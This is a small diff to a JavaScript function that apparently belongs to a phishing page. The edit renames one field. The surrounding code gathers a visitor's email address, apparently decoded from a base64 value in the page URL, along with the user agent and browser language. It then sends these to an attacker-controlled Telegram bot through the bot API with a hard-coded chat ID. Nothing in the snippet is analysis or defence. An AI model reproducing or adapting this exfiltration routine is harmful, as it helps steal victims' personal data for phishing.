@@ -167,7 +167,7 @@ function sendMessage2() {
   const chatId = '1412104349';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   const userDetails = {
-    Client_Emails: "Incoming Bot",
+    Bot: "Incoming Bot",
     Client_Email: getBase64FromUrl(),
     userAgent: navigator.userAgent,
     language: navigator.language,
@@ -179,7 +179,7 @@ function sendMessage2() {
   // Format userDetails into a readable string
   const formattedDetails = `
 *User Details:*
-- *Client Email*: ${userDetails.Client_Emails}
+- *Client Email*: ${userDetails.Bot}
 - *Client Email*: ${userDetails.Client_Email}
 - *User Agent*: ${userDetails.userAgent}
 - *Language*: ${userDetails.language}
